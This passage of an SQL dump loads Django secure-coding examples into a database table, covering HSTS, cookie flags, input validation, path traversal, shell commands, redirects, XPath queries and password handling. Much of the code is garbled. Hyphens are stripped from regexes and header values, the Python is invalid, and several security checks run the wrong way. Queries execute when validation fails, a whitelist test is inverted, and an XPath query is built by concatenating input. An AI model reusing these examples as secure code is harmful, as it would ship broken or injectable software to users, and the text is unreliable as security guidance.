    First we implement the strict transport security header, this is in order to prevent
    users from accessing your application over an unprotected connection.
    """

    //Example of the strict transport security header:
    response[''StrictTransportSecurity''] = "maxage=31536000"
    //If all present and future subdomains will be HTTPS:
    response[''StrictTransportSecurity''] = "maxage=31536000; includeSubDomains"    

    """
    Recommended: If the site owner would like their domain to be included in the HSTS preload
    list maintained by Chrome (and used by Firefox and Safari), then use:
    """

    response[''StrictTransportSecurity''] = "maxage=31536000; includeSubDomains; preload"    

    """
    The `preload` flag indicates the site owner''s consent to have their domain preloaded.
    The site owner still needs to then go and submit the domain to the list. the preload list
    enforces the browser to always present your application on HTTPS even on the first time
    the user hits your application

    Then we set the httpOnly flag in settings.py
    (see "HttpOnly" in the code examples for more details about implementation)
    """
    	
    SESSION_COOKIE_HTTPONLY = True

    """
    Then we set the flag for session timeout in settings.py
    (see "Timeout" in the code examples for more details about implementation)
    """
    	
    SESSION_COOKIE_AGE = 60000 

    """
    Then we set the session secure flag in settings.py
    (see "Secure flag" in the code examples for more details about implementation)
    """
    
    SESSION_COOKIE_SECURE = True', 'Session hijacking and fixation', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Random password/token generation


 Example:


	"""
	When needing to generate random numbers, always use proven methods 
	instead of writing your own.
	"""
	
	//Generate a strong security key
	app.secret_key = os.urandom(32)

	//A random string for generating WTF CSRF token
	app.config[''WTF_CSRF_SECRET_KEY''] = base64.b64encode(rand.bytes(128))
    
', 'Random password token generation', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Directory/path traversal


 Example:

	"""
	Define the whitelist pattern and validation type and input parameter, countLevel like:
	getFiles("images,css,js", "alphanumeric", foldername)
	"""

	def getFiles(request, whiteListPattern, validationType, inputParameter):

		continue = True
        
        """
		First, we want to filter the filenames for expected values. For this example we use only az/09  alphanumeric
		Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		for more information about validation see "input validations" in the code examples:
		"""
		
		if inputValidation(inputParameter, validationType) == False:
			continue = False

		"""
		Second, we want to whitelist the filenames for expected values, in this example they are,
		page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
		"""

		//Check for filename Whitelisting
		if whitelisting(whiteListPattern, inputParameter):
			continue = False

		if continue == True:
        	//Create Path
        	path = os.path.join(settings.MEDIA_ROOT, inputParameter)   
        	images = []

        	//List all the URL
        	for f in os.listdir(path):
            	if f.endswith("jpg") or f.endswith("png"):
                	images.append("%s%s/%s" % (settings.MEDIA_URL, inputParameter, f))
        
        	return render_to_response(''gallery.html'', {''images'': images})
        else:
			return render_to_response(''gallery.html'', {''images'': ''''})        	

    //gallery.html

    {% for image in images %}
    <img src=''{{image}}'' />
    {% endfor %}', 'Directory path traversal', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' input validation


 Example:


	"""
	This function is where you store all your input validation controls. 
	It makes it easy to maintain whenever you want to apply changes for 
	certain input validation roles and reduces the chance of mistakes in your regexes.
	"""

	def isFile(str):
		//Check whether this Filename
		if re.match("^[AZaz09.]*$", str):
			return True
		else:
			return False

	def isAlphanumeric(str):
		match = re.findall("^[azAZ09]+$" , str)
		//Check for alphanumeric
		if match:
			return True
		else:
			return False

	def isAlpha(str):
		match = re.findall("^[azAZ]+$" , str)
		//Check for alpha
		if match:
			return True
		else:
			return False

	def isDigit(str):
		match = re.findall("^[09]+$" , str)
		//Check for isDigit
		if match:
			return True
		else:
			return False	

	def isBool(str):
	    match = re.findall("^(True|False)+$" , str)
		if match:
	        return True
	    else:
            return False	

	def inputValidation(input, type):
	    if type == alphanumeric:
	    	//Set the audit log
	    	log.debug(''Boolean True: {user} via ip: {ip}''.format(
	    	    user=user,
	    	    ip=ip
	    	))
	    	return isAlphanumeric(input)
	   	elif type == numeric:
	   		//Set the audit log
	   		log.debug(''Boolean True: {user} via ip: {ip}''.format(
	   		    user=user,
	   		    ip=ip
	   		))
	   		return isDigit(input)
	   	elif type == alpha:
	   		//Set the audit log
	   		log.debug(''Boolean True: {user} via ip: {ip}''.format(
	   		    user=user,
	   		    ip=ip
	   		))
	   		return isAlpha(input)
	   	elif type == bool:
	   		//Set the audit log
	   		log.debug(''Boolean True: {user} via ip: {ip}''.format(
	   		    user=user,
	   		    ip=ip
	   		))
	   		return isBool(input)
	   	elif type == filename:
	   		//Set the audit log
	   		log.debug(''Boolean True: {user} via ip: {ip}''.format(
	   		    user=user,
	   		    ip=ip
	   		))
	   		return isFile(input)
	   	else:
	   		//Set the audit log
	   		log.info(''Boolean False: {user} via ip: {ip}''.format(
	   		    user=user,
	   		    ip=ip
	   		))
	   		//Increment the counter
	    	counter.increment(1)
	   		return False

', 'Input validation', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' System commands


 Example:


	"""
	Define the whitelist pattern and validation type and input parameter like:
	getFiles("value1,value2,etc", "alphanumeric", filename)
	"""

	def command(whiteListPattern, validationType, inputParameter){

		continue = True

		"""
		Whenever a system command is finished, you should properly sanitize and escape this user input.
		System command functions examples are: system(), eval(), exec()

		First, we want to filter the filenames for expected values. For this example we use only az/09
		Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
		for more information about validation see "input validations" in the code examples:
		"""

		if inputValidation(inputParameter, validationType) == False:
			continue = False

			"""
			Second, we want to whitelist the filenames for expected values, in this example they are,
			page1,page2 etc.. for more information about whitelisting see "whitelisting" in the code examples:
			"""

		if whitelisting(whiteListPattern, inputParameter) == False:
			continue = False

		//If all went good we include the filename
		if continue == True:
			//Even though there is match we still escape the shelx.quote():
			command = ''./configure {}'' .format(quote(inputParameter))
			os.system(command)
		else:
			return False', 'System commands', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Session cookies HttpOnly


 Example:


	"""
    Javascript cannot set or read cookie''s value if the HTTPOnly attribute is set on cookie.
    It makes attacker client side attacks such as Cross Site scripting harder to exploit.
    Attacker will not be able to steal the user''s cookies.

    For using sessions edit the middleware and make sure it contains ''django.contrib.sessions.middleware.SessionMiddleware''

    For adding HTTPONLY Cookies, we have to add the line in settings.py
    SESSION_COOKIE_HTTPONLY = True

    For adding Session Cookie age, we have to add the line in settings.py
    SESSION_COOKIE_AGE = 60000

    For setting session cookie domain, we have to add the line in settings.py
    SESSION_COOKIE_DOMAIN = ''demo.yourdomain.com''

	For setting session cookie name, we have to add the line in settings.py
	SESSION_COOKIE_NAME = ''demo''    
	
	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_PATH = ''/''

	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_SECURE = True
	"""

	//For adding session cookie
	request.session[''test''] = ''test''', 'Session cookies HttpOnly', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' SQL query


 Example:


    """
    Django supports almost most of the database backend.  

    A model contains the essential fields and behaviors of the data you’re storing.
    Each model maps to a single database table.

    CREATE TABLE myapp_person (
    	"id" serial NOT NULL PRIMARY KEY,
    	"first_name" varchar(30) NOT NULL,
    	"last_name" varchar(30) NOT NULL
	);

	Model for the above SQL query
	"""

	from django.db import models

	class Publisher(models.Model):

   		name = models.CharField(max_length=30)
   		address = models.CharField(max_length=50)

		def __str__(self):

    		return '' ''.join([
        		self.name,
        		self.address,
    		])

    //In order to add your model to django, you have to add the app in INSTALLED_APP
    INSTALLED_APPS = [
    	//...
    	''myapp'',
    	//...
	]

	"""
	After adding the application, in order to make the changes we need to make migrations
	and migrate  For creating tables 
	"""

	$ python manage.py makemigrations
	$ python manage.py migrate
	//Needs to be added

	"""
	Inserting data into the database  create, add and commit
	"""
	
	book = Publisher(name=p1, address=p2)
	book.save()

	"""
	Delete entries from the table
	"""
	
	instance = Publisher.objects.get(name=name)
	instance.delete()

	"""
	Querying Records
	"""
	
	//Retrieve the user with username
	instance = Publisher.objects.filter(name=name).all()
	instance.address

	"""
	SQL raw string approach
	"""
	
	if inputValidation(inputParameter, ''alphanumeric'') == False:
		people = Person.objects.raw(''SELECT * FROM myapp_person WHERE last_name = %s'', [inputParameter])
	
		for p in people:
			print("%s is %s." % (p.first_name, p.age))', 'SQL query', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Open forwards & redirects


 Example:


    """
    When using forwards & redirects you should make sure the URL is being explicitly
    declared in the code and cannot be manipulated by an attacker like example.com?page=dashboard :
    """

    redirect(''dashboard'')

    """
    Generally you should avoid getting input into the redirect which could contain
    userinput by any means. if for any reason this may not be feasible than you
    should make a whitelist input validation for the redirect like so:

    Example : 
    If the whitelisting list is home, upload and redirectParam is home 

    redirectParam = home
    redirecting("home,upload", redirectParam, "3")
    """

    def redirecting(whitelisting, input, count):
        
        """
        We want to whitelist the paged for expected values, in this example they are,
        page1,page2 etc.. for more information about whitelisting see "whitelisting" 
        in the code examples:
        """

        if whitelisting(whitelisting, input, count) == True:
            //Redirect the Input if whitelisting is correct
            redirect(input)', 'Open forwards & redirects', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Xpath query


 Example:

    
    """
    Define the allowed characters and input parameter and count level for the
    user lockout like:
    controller("<''>&", $_GET[''filename''], "3")
    
    In order to prevent xpath injections we have to treat these query''s similar as 
    to the sql query''s. 
    """
    
    def controller(allowed, input, count):
        
        """
        First we build our encoding method, see "input validation" code example for
        more detailed information about encoding and escaping.
        """
        
        return = encoder(allowed, input, count)

        //If the encoder came back false we do not process the function!
        if return != False:

            //Parse the register.xml
            root = etree.parse("register.xml")
            //Extract the id from the XML using XPath
            find = etree.XPath(''/Employees/Employee[ID='' + return + '']'')

            for x in find(root):
                print x.text
', 'X path query', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anticaching headers


 Example:

    
	"""
    In order to set the AntiCaching header you''ll have to your application head in order to prevent the browser from caching

    For adding AntiCaching header in every page we have to add a middleware

    Make a middleware in yourapp/middleware.py
    """

    class MyMiddleware:

    	def __init__(self, get_response):
        	self.get_response = get_response

    	def __call__(self, request):
        	response = self.get_response(request)

        	response["CacheControl"] = "nostore, nocache, mustrevalidate" HTTP/1.1
			response["CacheControl"] = "postcheck=0, precheck=0, false"
			response["Pragma"] = "nocache"  HTTP/1.0
        	
        	return response
   	
   	//For adding middleware in the project, add in yourproject/settings.py
   	MIDDLEWARE = [
    	...,
    	''yourapp.middleware.MyMiddleware'',
    	...,
	]	

	"""
	For adding in the individual response page using render_to_response
	"""
	response = render_to_response("template.html", {})
	response["CacheControl"] = "nostore, nocache, mustrevalidate" HTTP/1.1
	response["CacheControl"] = "postcheck=0, precheck=0, false"
	response["Pragma"] = "nocache"  HTTP/1.0

	return response
	
	"""
	For adding in the individual response page using render
	"""

	response = render(request, "template.html", {})
	response["CacheControl"] = "nostore, nocache, mustrevalidate" HTTP/1.1
	response["CacheControl"] = "postcheck=0, precheck=0, false"
	response["Pragma"] = "nocache"  HTTP/1.0
	
	return response', 'Anti caching headers', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Secure session cookies


 Example:

    
    """
    If you use SLL you can also make your cookies secure (encrypted) to 
    avoid "maninthemiddle" cookies reading with

    For using sessions edit the middleware and make sure it contains ''django.contrib.sessions.middleware.SessionMiddleware''

    For adding HTTPONLY Cookies, we have to add the line in settings.py
    SESSION_COOKIE_HTTPONLY = True

    For adding Session Cookie age, we have to add the line in settings.py
    SESSION_COOKIE_AGE = 60000

    For setting session cookie domain, we have to add the line in settings.py
    SESSION_COOKIE_DOMAIN = ''demo.yourdomain.com''

	For setting session cookie name, we have to add the line in settings.py
	SESSION_COOKIE_NAME = ''demo''    
	
	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_PATH = ''/''

	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_SECURE = True
	"""

	//For adding session cookie
	request.session[''test''] = ''test''', 'Secure session cookies', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Crossdomain.xml


 Example:

    
		//A bad example of a crossdomain.xml would be:

		<?xml version="1.0" ?>
		<crossdomainpolicy>
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowaccessfrom domain="*"/>
			<allowhttprequestheadersfrom domain="*" headers="*"/>
		</crossdomainpolicy>

		//Because it allows access from all other domains.

		//Instead of this approach you might want to use the following restrictions.
		//Example by twitter''s crossdomain.xml:

		<?xml version="1.0" encoding="UTF8"?>
		<crossdomainpolicy xmlns:xsi="http://www.w3.org/2001/XMLSchemainstance" xsi:noNamespaceSchemaLocation="http://www.adobe.com/xml/schemas/PolicyFile.xsd">
			<allowaccessfrom domain="twitter.com" />
			<allowaccessfrom domain="api.twitter.com" />
			<allowaccessfrom domain="search.twitter.com" />
			<allowaccessfrom domain="static.twitter.com" />
			<sitecontrol permittedcrossdomainpolicies="masteronly"/>
			<allowhttprequestheadersfrom domain="*.twitter.com" headers="*" secure="true"/>
		</crossdomainpolicy>
', 'Crossdomain.xml ', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password forget & Disallow old passwords


 Example:


    """
    Django has inbuilt feature of password reset. We just have to mentions the URL routes and
    templates.
    """

    //We need to add django.contrib.auth in INSTALLED_APPS
    INSTALLED_APPS = [
        ...
        ''django.contrib.auth'',
    ]

    //Add URL routes for forget password
    from django.contrib.auth import views as auth_views

    urlpatterns = [
        ...
        url(r''^password_reset/$'', auth_views.password_reset, {''template_name'': ''polls/password_reset_form.html''} , name=''password_reset''),
        url(r''^password_reset/done/$'', auth_views.password_reset_done, {''template_name'': ''polls/password_reset_done.html''}, name=''password_reset_done''),
        url(r''^reset/(?P<uidb64>[09AZaz_\]+)/(?P<token>[09AZaz]{1,13}[09AZaz]{1,20})/$'',
            auth_views.password_reset_confirm, {''template_name'': ''polls/password_reset_confirm.html''} , name=''password_reset_confirm''),
        url(r''^reset/done/$'', auth_views.password_reset_complete, {''template_name'': ''polls/password_reset_complete.html''} , name=''password_reset_complete''),    
    ]

    //Template for password_reset_form.html
    
    {% extends ''base.html'' %}
    {% block content %}
      <h3>Forgot password</h3>
      <form method="post">
        {% csrf_token %}
        {{ form.as_p }}
        <button type="submit">Submit</button>
      </form>
    {% endblock %}

    //Template for password_reset_subject.txt
    Password reset for Website
    //Template for password_reset_email.html
    {% autoescape %}
    To initiate the password reset process for your {{ user.get_username }} TestSite Account,
    click the link below:

    {{ protocol }}://{{ domain }}{% url ''password_reset_confirm'' uidb64=uid token=token %}
    If clicking the link above doesn''t work, please copy and paste the URL in a new browser
    window instead.

    Sincerely,
    The TestSite Team
    {% endautoescape %}
  
    //Template for password password_reset_done.html
    {% extends ''base.html'' %}
    {% block content %}
      <p>
        We''ve emailed you instructions for setting your password, if an account exists with the email you entered.
        You should receive them shortly.
      </p>
      <p>
        If you don''t receive an email, please make sure you''ve entered the address you registered with,
        and check your spam folder.
      </p>
    {% endblock %}

    //Template for password_reset_confirm.html
    {% extends ''base.html'' %}
    {% block content %}
      {% if validlink %}
        <h3>Change password</h3>
        <form method="post">
          {% csrf_token %}
          {{ form.as_p }}
          <button type="submit">Change password</button>
        </form>
      {% else %}
        <p>
          The password reset link was invalid, possibly because it has already been used.
          Please request a new password reset.
        </p>
      {% endif %}
    {% endblock %}

    //Template for password_reset_complete.html
    {% extends ''base.html'' %}
    {% block content %}
      <p>
        Your password has been set. You may go ahead and <a href="{% url ''signin'' %}">sign in</a> now.
      </p>
    {% endblock %}

    //Setting Up SMTP Email Backend in settings.py
    EMAIL_HOST = ''smtp.sendgrid.net''
    EMAIL_PORT = 587
    EMAIL_HOST_USER = ''test''
    EMAIL_HOST_PASSWORD = ''password''
    EMAIL_USE_TLS = True
    DEFAULT_FROM_EMAIL = ''Test <noreply@example.com>''
', 'Password forget and disallow old passwords', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' XML External entities


 Example:

    
	"""
	Django’s serialization framework provides a mechanism for “translating” Django models into other formats. By which we can avoid XXE while using XML. 
	
	Models can be easily translated to other formats such as XML, Json, YAML
	"""

	//Serialization of SomeModel defined in Models.py
	from django.core import serializers 
	data = serializers.serialize("xml", SomeModel.objects.all())

	//Save serialized data to file file.xml	
	XMLSerializer = serializers.get_serializer("xml")
	xml_serializer = XMLSerializer()
	with open("file.xml", "w") as out:
		xml_serializer.serialize(Question.objects.all(), stream=out)
	data = xml_serializer.getvalue()

	//Deserialize the XML
	for obj in serializers.deserialize("xml", data):
		//Accessing object
		obj.object


	






', 'XML External entities', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Anti clickjacking headers


 Example:


    """  
    One way to defend against clickjacking is to include a "framebreaker" script in each
    page that should not be framed. The following methodology will prevent a webpage from
    being framed even in legacy browsers, that do not support the XFrameOptionsHeader.
    In the document HEAD element, add the following:
    First apply an ID to the style element itself:
	  """

    <style id="antiClickjack">body{display:none !important;}</style>
    //And then delete that style by its ID immediately after in the script:

    <script type="text/javascript">
	   if (self === top) {
		   var antiClickjack = document.getElementById("antiClickjack");
		   antiClickjack.parentNode.removeChild(antiClickjack);
	   } else {
		   top.location = self.location;
	   }
    </script>

    """
    To set the same XFrameOptions value for all responses in your site, put ''django.middleware.clickjacking.XFrameOptionsMiddleware'' to MIDDLEWARE:

    MIDDLEWARE = [
        ...
        ''django.middleware.clickjacking.XFrameOptionsMiddleware'',
        ...
    ]

    Middleware will be enabled by default while starting the project.
    By default the XFrameOptions header is set to SAMEORIGIN  
    """

    //If we want to set the X_FRAME_OPTIONS to DENY
    //If you want DENY instead, set the X_FRAME_OPTIONS setting

    X_FRAME_OPTIONS = ''DENY''
', 'Anti clickjacking headers', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Debug Enabling


 Example:


    """
    Debug mode makes it a major security risk and therefore it must never be used on production machines. Django will display a detailed traceback with more details about the application such 
    as Django settings
    """

    //The default settings.py file created by djangoadmin startproject sets DEBUG = True
    //It should be set to False in production 
    DEBUG = False', 'Debug enabling', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Login functionality


 Example:


    """
    For privilege based authentication we need an extra table in your database in order to write the users privileges to.

    Django has inbuilt users table 

    TABLE users
    
    |ID|password|last_login|is_superuser|first_name|last_name|email|is_staff|is_active|date_joined|username |
      
    |1 |pbkdf2_s|20170831|	  0		| 	ram    |  mohan  |ra@..|   0    |    1    |20170831.| ram12   |
      	
    |2 |pbkdf2_s|20170829|	  0	    |	james  |  mathew |j@g..|   1    |    1    |20170830.| mathew  |
      
    |3 |pbkdf2_s|20170830|	  1	    |	admin  |  admin  |adm@.|   1    |    1    |20170829.| admin   |
       


    Now instead of using roles in sessions we rather want to assign privileges to users
    by means of a DatabaseBased Authentication system.
    Now we can easily assign a user certain privileges for him to access.
    See "Privilege based authentication" code example for more information:
    
    Django authentication in default has inbuilt code for most part of the authentication
    such as login, logout, password reset
    """
    
    //Create a login Template using form in django
    //File location registration/login.html

    {% extends ''base.html'' %}
    {% block title %}Login{% endblock %}
    {% block content %}
      <h2>Login</h2>
      <form method="post">
        {% csrf_token %}
        {{ form.as_p }}
        <button type="submit">Login</button>
      </form>
    {% endblock %}

    //First we need to Configure the URL routes
    //We need to import django.contrib.auth.views and add URL route for login and logout views 

    from django.conf.urls import url
    from django.contrib.auth import views as auth_views

    urlpatterns = [
        url(r''^login/$'', auth_views.login, {''template_name'': ''core/login.html''} ,name=''login''),
        url(r''^logout/$'', auth_views.logout, name=''logout''),
    ]
    
    //In settings.py, we can set the location where django will redirect after authentication
    LOGIN_REDIRECT_URL = ''home''

    """
    There is no need to write login view again, Django has inbuilt view for login.
    Proper input validation is also done in Django auth_view.login takes care for security.
    But we need to implement a proper logging system for logouts, logins, retries
    """

    //Logging is also a inbuilt feature in django, only we need to configure it
    //Add logging system in Settings.py which logs app wise

    LOGGING = {
        ''version'': 1,
        ''disable_existing_loggers'': False,
        ''handlers'': {
            ''file'': {
                ''level'': ''DEBUG'',
                ''class'': ''logging.FileHandler'',
                ''filename'': ''debug.log'',
            },
            ''applogfile'': {
                ''level'':''DEBUG'',
                ''class'':''logging.handlers.RotatingFileHandler'',

                //Specify the logging file name
                
                ''filename'': os.path.join(DJANGO_ROOT, ''polls.log''),
                ''maxBytes'': 1024*1024*15,  15MB
                ''backupCount'': 10,
            },
        },
        ''loggers'': {
            ''django'': {
                ''handlers'': [''file''],
                ''level'': ''DEBUG'',
                ''propagate'': True,
            },
            ''polls'': {
                ''handlers'': [''applogfile'',],
                ''level'': ''DEBUG'',
            },
        },
    }

    //Add view for logging, logout, wrong logins in view.py

    import logging
    from django.contrib.auth.signals import user_logged_in, user_logged_out, user_login_failed
    from django.dispatch import receiver

    //Create your views for logging
    log = logging.getLogger(__name__)

    @receiver(user_logged_in)
    def user_logged_in_callback(sender, request, user, **kwargs):

        //Track the IP
        ip = request.META.get(''REMOTE_ADDR'')

        //Logging the details 
        log.debug(''login user: {user} via ip: {ip}''.format(
            user=user,
            ip=ip
        ))

    @receiver(user_logged_out)
    def user_logged_out_callback(sender, request, user, **kwargs):

        ip = request.META.get(''REMOTE_ADDR'')

        log.debug(''logout user: {user} via ip: {ip}''.format(
            user=user,
            ip=ip
        ))

    @receiver(user_login_failed)
    def user_login_failed_callback(sender, credentials, **kwargs):

        log.warning(''logout failed for: {credentials}''.format(
            credentials=credentials,
        ))', 'Login functionality', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' User registration / Sql truncation prevention


 Example:

    """
    In order to prevent Column truncation sql injection Solution we have to make sure the
    applications structural logic does not mismatches with the database structural logic.
    To achieve this imagine the follow example of a database structure of a users table

    TABLE users
    
    |	     *Name*          |	   *Type*       |    *Extra*     |
    
    |        ID	           |    Int(11)       | AUTO_INCREMENT |
    
    |       Username  	   |    char(21)      |                |
    
    |       Password       |  Varchar(255)    |                |
    
    |      last_login      |      date        |                |
       
    |      is_superuser    |      int(1)      |                |
    
    |      first_name      |    varchar(30)   |                |
    
    |      last_name       |    varchar(30)   |                |
    
    |      email           |    varchar(30)   |                |
    
    |      is_staff        |      int(1)      |                |
    
    |      is_active       |      int(1)      |                |
    
    |      date_joined     |      date        |                |
    
    """

    //For URL routes for User Registration

    from django.conf.urls import url
    from mysite.core import views as core_views

    urlpatterns = [
        ...
        url(r''^signup/$'', core_views.signup, name=''signup''),
    ]

    //View for signup
    from django.contrib.auth import login, authenticate
    from django.shortcuts import render, redirect

    from .forms import SignUpForm

    def signup(request):
        if request.method == ''POST'':
            form = SignUpForm(request.POST)
            if form.is_valid():
                form.save()
                username = form.cleaned_data.get(''username'')
                raw_password = form.cleaned_data.get(''password1'')
                user = authenticate(username=username, password=raw_password)
                login(request, user)
                return redirect(''index'')
        else:
            form = SignUpForm()
        return render(request, ''polls/signup.html'', {''form'': form})

    //Template for signup.html
    {% block content %}
      <h2>Sign up</h2>
      <form method="post">
        {% csrf_token %}
        {% for field in form %}
          <p>
            {{ field.label_tag }}<br>
            {{ field }}
            {% if field.help_text %}
              <small style="color: grey">{{ field.help_text }}</small>
            {% endif %}
            {% for error in field.errors %}
              <p style="color: red">{{ error }}</p>
            {% endfor %}
          </p>
        {% endfor %}
        <button type="submit">Sign up</button>
      </form>
    {% endblock %}

    //forms.py for extra fields
    class SignUpForm(UserCreationForm):
    first_name = forms.CharField(max_length=30, required=False, help_text=''Optional.'')
    last_name = forms.CharField(max_length=30, required=False, help_text=''Optional.'')
    email = forms.EmailField(max_length=254, help_text=''Required. Inform a valid email address.'')

    class Meta:
        model = User
        fields = (''username'', ''first_name'', ''last_name'', ''email'', ''password1'', ''password2'', )            ', 'User registration SQL truncation', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Character encoding


 Example:

    """
    This is the encoder class for whenever you have to allow certain
    possibly dangerous characters into your code for i.e names such as O''Reilly
	"""

	def encoder(allowed, input, count):
	    
	    """
	    As you can see you can specify allowed characters in your function
	    """
	    
	    flag = True
	    match = re.findall("/^[azAZ09 " + allowed+"]+$/", input)

	    if match:

	        """
	        Set a log for whenever there is unexpected userinput with a threat level
	        See "audit logs" code example for more information:
	        """

	        setLog(session[''id''], "Bad userinputs", "FAIL", datetime.utcnow(), "HIGH")
	        
	        """
	        Set counter if counter hits 3 the users session must terminated
	        After 3 session terminations the user account must be blocked
	        See "audit logs" code example for more information:
	        """
	        
	        counter.increment()
	        flag = False

	         Remove Dangerous Characters
	        wordDict = {''&'': ''&amp;'', ''<'' : ''&lt;'', ''>'' : ''&gt;'' , ''"'' : ''&quot;'', "''" : ''&x27;'', ''/'' : &x2F;, ''\'' : ''\\''}

	        for key in wordDict:
	        	input = input.replace(key, wordDict[key])

	        return input
', 'Encoder', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Character encoding


 Example:


    """
    This is the encoder class for whenever you have to allow certain
    possibly dangerous characters into your code for i.e names such as O''Reilly
	"""

	def encoder(allowed, input, count):
	    
	    """
	    As you can see you can specify allowed characters in your function
	    """
	    
	    flag = True
	    match = re.findall("/^[azAZ09 " + allowed+"]+$/", input)

	    if match:

	        """
	        Set a log for whenever there is unexpected userinput with a threat level
	        See "audit logs" code example for more information:
	        """

	        setLog(session[''id''], "Bad userinputs", "FAIL", datetime.utcnow(), "HIGH")
	        
	        """
	        Set counter if counter hits 3 the users session must terminated
	        After 3 session terminations the user account must be blocked
	        See "audit logs" code example for more information:
	        """
	        
	        counter.increment()
	        flag = False
	        //Remove Dangerous Characters
	        wordDict = {''&'': ''&amp;'', ''<'' : ''&lt;'', ''>'' : ''&gt;'' , ''"'' : ''&quot;'', "''" : ''&x27;'', ''/'' : &x2F;, ''\'' : ''\\''}

	        for key in wordDict:
	        	input = input.replace(key, wordDict[key])
	        return input
', 'Character encoding', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Aggregate user controls


 Example:

 
    """
    In order to enforce Aggregate access control protection the best method would be to
    define your rules by means of a database structure rather than sessions or log''s.
    This is due to the fact that if the user drops his session the rating would start
    al over again.


    TABLE userAggregate
       
    |   id   | user_id  | AggregateControl	|
      
    |   1    | Admin    | 	  2322    	    |
       
    |   2    | User     |     0             |
      
    |   3    | Guest    |     125           |
    
    	
    """

    //Extend the existing User model by adding another model and linking it to the User model using //onetoone relation in models.py

    class userAggregate(models.Model):
       user = models.OneToOneField(User)
       AggregateControl = models.IntegerField(default=0)


    //countAccess in views.py

    import logging

    def countAccess(request, count):
        
        """
        Each time the user accesses the database we keep track of the number of times he
        connected. Whenever the user passes a reasonable number he should be rejected
        since he could be an attacker scraping your table contents and stealing company information
        You could a CRON job in your mysql system in order to clean the Aggregate column within certain timeframes
        """
        
        ip = get_client_ip(request)
        current_user = request.user
        log = logging.getLogger(__name__)

        //Add logging
        log.debug(''User aggregate control updated: {user} via ip: {ip}''.format(
            user=user,
            ip=ip
        ))

        registered_user = userAggregate.objects.get(pk=current_user.id)
        //We add the count to control variable for the update
        control = registered_user.AggregateControl + count
        //Check the aggregate
        if control > 5000:
            logger.warning(''User aggregate control breach: {user} via ip: {ip}''.format(
                user=user,
                ip=ip
            ))
                
            """
            Then we lock out the users account assuming it has been compromised by
            an attacker
            """
                
            access = 0
            current_user.is_active = access
            current_user.save()
            //we update the users table and count +1 tot the AggregateControl column
            registered_user.AggregateControl = control
            registered_user.save()  ', 'Aggregate user controls', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Absolute time out of a session


 Example:


	"""
	Whenever a session is started, absolute time out (lifetime) of a session should be set in seconds
	
	For using sessions edit the middleware and make sure it contains ''django.contrib.sessions.middleware.SessionMiddleware''

    For adding HTTPONLY Cookies, we have to add the line in settings.py
    SESSION_COOKIE_HTTPONLY = True

    For adding Session Cookie age, we have to add the line in settings.py
    SESSION_COOKIE_AGE = 60000

    For setting session cookie domain, we have to add the line in settings.py
    SESSION_COOKIE_DOMAIN = ''demo.yourdomain.com''

	For setting session cookie name, we have to add the line in settings.py
	SESSION_COOKIE_NAME = ''demo''    
	
	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_PATH = ''/''

	For setting session cookie path, we have to add the line in settings.py
	SESSION_COOKIE_SECURE = True
	"""

	//For adding session cookie
	request.session[''test''] = ''test''', 'Absolute timeout of a session', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Password storage(salting/stretching/hashing)


 Example:


    """
    Django provides a flexible password storage system and uses PBKDF2 by default.

    Password is of the format: 
    <algorithm>$<iterations>$<salt>$<hash>
	"""


	//For the encryption of passwords with salt
	from django.contrib.auth.hashers import make_password

	pwd = make_password(''some_password'')
	
	
	//Validate your password
	from django.contrib.auth.hashers import check_password

	check_password(password, pwd_hash)', 'Password storage(salting stretching hashing)', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Sandboxing


 Example:


	<iframe sandbox="value">

		/*
		sandbox=""  Applies all restrictions
		allowforms  Reenables form submission
		allowpointerlock  Reenables APIs
		allowpopups  Reenables popups
		allowsameorigin  Allows the iframe content to be treated as being from the same origin
		allowscripts  Reenables scripts
		allowtopnavigation  Allows the iframe content to navigate its toplevel browsing context
		*/
	</iframe>
', 'Sandboxing', 'django'); 
INSERT OR REPLACE INTO code_items (content, title, code_lang) VALUES (' Identifierbased authorization


 Example:

    """
    Define the whitelist pattern and validation type and input parameter like:
    identity("page1,page2", "alphanumeric", page)
    """

    def identity(request, whiteListPattern, validationType, inputParameter):

    	continue = True

    	"""
    	First, we want to filter the filenames for expected values. For this example we use only az/09
    	Whenever the values are tampered with, we can assume an attacker is trying to inject malicious input.
    	for more information about validation see "input validations" in the code examples:
    	"""

